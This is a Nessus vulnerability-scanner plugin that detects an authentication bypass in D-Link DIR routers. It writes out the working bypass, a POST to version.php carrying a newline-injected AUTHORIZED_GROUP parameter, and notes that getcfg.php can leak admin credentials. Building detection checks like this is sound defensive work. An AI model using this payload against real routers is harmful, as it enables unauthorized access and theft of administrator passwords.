#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(103789);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/09/03");


  script_name(english:"D-Link DIR Router Authenication Bypass");
  script_summary(english:"Sends an HTTP POST request");

  script_set_attribute(attribute:"synopsis", value:
"The remote router doesn't properly enforce authentication");
  script_set_attribute(attribute:"description", value:
"The remote D-Link DIR router does not properly enforce
authentication when a remote user makes a crafted POST
request to getcfg.php or version.php. An attacker can
use this weakness to recover the administrator username
and password.");
  script_set_attribute(attribute:"solution", value:
"Apply the latest firmware update. D-Link may have not patched all
vulnerable devices.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Based on analysis of vulnerability");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/09/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/08/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2021 Tenable Network Security, Inc.");

  script_dependencies("dlink_dir_www_detect.nbin");
  script_require_keys("installed_sw/DLink DIR");
  script_require_ports("Services/www", 80, 8080, 8181, 443, 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = 'DLink DIR';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

# the juicy information can be extracted from getcfg.php but its better
# to exploit version.php from a Nessus/.io point of view since it won't
# put our user's admin/pass on the wire.
uri = '/version.php';
res = http_send_recv3(
  method:'POST',
  item:uri,
  port:port,
  add_headers: {'Content-Type':'text/plain;charset=UTF-8', 'Content-Length':'0'},
  exit_on_fail:FALSE);

# Check first that we get an auth failure message. Note that the 850
# has a different spelling of "authentication" then the 890.
if (empty_or_null(res) || "200 OK" >!< res[0] ||
    ("Authenication fail" >!< res[2]) && ("Authetication Fail" >!< res[2]))
{
  audit(AUDIT_HOST_NOT, "an affected D-Link DIR router");
}

# now try again with the auth bypass
action = '?A=A%0aAUTHORIZED_GROUP%3d1';
res = http_send_recv3(
  method:'POST',
  item:uri + action,
  port:port,
  add_headers: {'Content-Type':'text/plain;charset=UTF-8', 'Content-Length':'0'},
  exit_on_fail:FALSE);

if (empty_or_null(res) || "200 OK" >!< res[0] ||
    "function GetQueryUrl()" >!< res[2])
{
  # Looks like we didn't bypass anything
  audit(AUDIT_HOST_NOT, "an affected D-Link DIR router");
}

var report = 
  '\n' + "Nessus was able to send a POST request to the" +
  '\n' + "following URL to bypass authentication:" +
  '\n' +
  '\n' + build_url(qs:uri + action, port:port) +
  '\n' +
  '\n' + "This bypass technique can be used to recover" +
  '\n' + "the admin username and password." +
  '\n';
security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);
exit(0);
